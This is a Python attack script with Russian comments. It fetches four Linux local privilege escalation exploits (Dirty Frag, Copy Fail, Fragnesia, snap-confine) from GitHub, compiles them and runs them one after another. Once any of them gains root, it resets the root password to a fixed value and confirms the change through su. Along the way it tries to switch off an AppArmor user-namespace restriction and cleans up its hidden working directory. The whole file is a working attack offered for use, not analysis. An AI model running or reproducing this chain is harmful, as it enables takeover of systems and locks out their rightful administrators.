#!/usr/bin/env python3
# universal_lpe.py - Tries all 4 LPE exploits, changes root password to 'noddened'

import subprocess
import os
import sys
import tempfile
import shutil
import time
import crypt
from pathlib import Path

NEW_PASSWORD = "noddened"
WORK_DIR = tempfile.mkdtemp(prefix=".x_")

# Репозитории эксплойтов
REPOS = {
    "dirtyfrag": "https://github.com/V4bel/dirtyfrag.git",
    "copyfail": "https://github.com/tgies/copy-fail-c.git",
    "fragnesia": "https://github.com/0xBlackash/CVE-2026-46300.git",
    "snapd": "https://github.com/nomaisthere/CVE-2026-3888.git"
}

def cleanup():
    shutil.rmtree(WORK_DIR, ignore_errors=True)

def change_password():
    """Меняет пароль root на noddened. Использует две строки для chpasswd."""
    try:
        # Используем Popen для корректной обработки ввода/вывода
        proc = subprocess.Popen(['chpasswd'], stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
        # ПЕРЕДАЕМ ДВЕ ОДИНАКОВЫЕ СТРОКИ ДЛЯ ПОДТВЕРЖДЕНИЯ ПАРОЛЯ
        stdout, stderr = proc.communicate(input=f"root:{NEW_PASSWORD}\nroot:{NEW_PASSWORD}")
        if proc.returncode != 0:
            # Если chpasswd вернул ошибку, выводим ее в stderr для диагностики
            print(f"Ошибка chpasswd: {stderr}", file=sys.stderr)
            return False
        return True
    except Exception as e:
        print(f"Ошибка при смене пароля: {e}", file=sys.stderr)
        return False

def is_root():
    """Проверяет, является ли текущий пользователь root."""
    return os.geteuid() == 0

def check_password_change():
    """Проверяет, изменился ли пароль root на 'noddened'."""
    try:
        # Пытаемся выполнить команду от root с новым паролем
        test_cmd = subprocess.run(
            ["su", "-c", "echo 'password_check_success'", "root"],
            input=f"{NEW_PASSWORD}\n",
            capture_output=True,
            text=True,
            timeout=5
        )
        return "password_check_success" in test_cmd.stdout
    except:
        return False

def run_dirtyfrag():
    """CVE-2026-43500 - Dirty Frag (RxRPC)"""
    # Проверка модуля rxrpc
    result = subprocess.run(["lsmod"], capture_output=True, text=True)
    if "rxrpc" not in result.stdout:
        return False

    os.chdir(WORK_DIR)
    subprocess.run(["git", "clone", "--depth", "1", REPOS["dirtyfrag"], "dirtyfrag"], capture_output=True)
    os.chdir("dirtyfrag")
    subprocess.run(["gcc", "-O0", "-Wall", "-o", "exp", "exp.c", "-lutil"], capture_output=True)
    if not Path("exp").exists():
        return False

    # Запуск эксплойта. Команду chpasswd убрали, эксплойт только повышает привилегии.
    try:
        proc = subprocess.Popen(["./exp"], stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
        # Просто запускаем эксплойт и ждем
        proc.communicate(timeout=10)
        # Проверяем, стали ли мы root
        return is_root()
    except:
        return False

def run_copyfail():
    """CVE-2026-31431 - Copy Fail (AF_ALG)"""
    # Проверка модуля algif_aead
    result = subprocess.run(["lsmod"], capture_output=True, text=True)
    if "algif_aead" not in result.stdout:
        return False

    os.chdir(WORK_DIR)
    subprocess.run(["git", "clone", "--depth", "1", REPOS["copyfail"], "copyfail"], capture_output=True)
    os.chdir("copyfail")
    subprocess.run(["gcc", "-o", "exploit", "exploit.c", "utils.c", "-Wall"], capture_output=True)
    if not Path("exploit").exists():
        return False

    try:
        proc = subprocess.Popen(["./exploit"], stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
        proc.communicate(timeout=10)
        return is_root()
    except:
        return False

def run_fragnesia():
    """CVE-2026-46300 - Fragnesia (ESP-in-TCP)"""
    os.chdir(WORK_DIR)
    subprocess.run(["git", "clone", "--depth", "1", REPOS["fragnesia"], "fragnesia"], capture_output=True)
    os.chdir("fragnesia")

    # Попытка отключить AppArmor
    apparmor_file = "/proc/sys/kernel/apparmor_restrict_unprivileged_userns"
    if os.path.exists(apparmor_file):
        try:
            with open(apparmor_file, 'w') as f:
                f.write('0')
        except:
            pass

    if Path("CVE-2026-46300.py").exists():
        result = subprocess.run(["python3", "CVE-2026-46300.py"], capture_output=True, text=True, timeout=30)
        return "root" in result.stdout.lower() or is_root()
    elif Path("CVE-2026-46300.sh").exists():
        result = subprocess.run(["bash", "CVE-2026-46300.sh"], capture_output=True, text=True, timeout=30)
        return "root" in result.stdout.lower() or is_root()
    return False

def run_snapd():
    """CVE-2026-3888 - snap-confine + systemd-tmpfiles"""
    # Проверка наличия snapd
    result = subprocess.run(["which", "snap"], capture_output=True)
    if result.returncode != 0:
        return False

    os.chdir(WORK_DIR)
    subprocess.run(["git", "clone", "--depth", "1", REPOS["snapd"], "snapd_exp"], capture_output=True)
    os.chdir("snapd_exp/src")
    subprocess.run(["gcc", "-o", "firefox_2404", "firefox_2404.c"], capture_output=True)
    subprocess.run(["gcc", "-o", "librootshell.so", "-shared", "-fPIC", "librootshell.c"], capture_output=True)
    if not Path("firefox_2404").exists():
        return False

    try:
        proc = subprocess.Popen(["./firefox_2404"], stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
        proc.communicate(timeout=60)
        return is_root()
    except:
        return False

def main():
    # Уже root
    if is_root():
        if change_password() and check_password_change():
            print("Уже root - Успешно \n Новый пароль от root: noddened")
        else:
            print("Ошибка повышения привилегий")
        cleanup()
        return

    # Проверка компилятора
    gcc_check = subprocess.run(["which", "gcc"], capture_output=True)
    if gcc_check.returncode != 0:
        print("Ошибка повышения привилегий")
        cleanup()
        return

    # Перебираем эксплойты
    exploits = [
        ("Dirty Frag", run_dirtyfrag),
        ("Copy Fail", run_copyfail),
        ("Fragnesia", run_fragnesia),
        ("snap-confine", run_snapd)
    ]

    for name, func in exploits:
        try:
            if func():
                # Двойная проверка: сначала is_root(), потом смена пароля
                if is_root() and change_password() and check_password_change():
                    print(f"{name} - Успешно \n Новый пароль от root: noddened")
                    cleanup()
                    return
        except Exception:
            continue

    print("Ошибка повышения привилегий")
    cleanup()

if __name__ == "__main__":
    main()
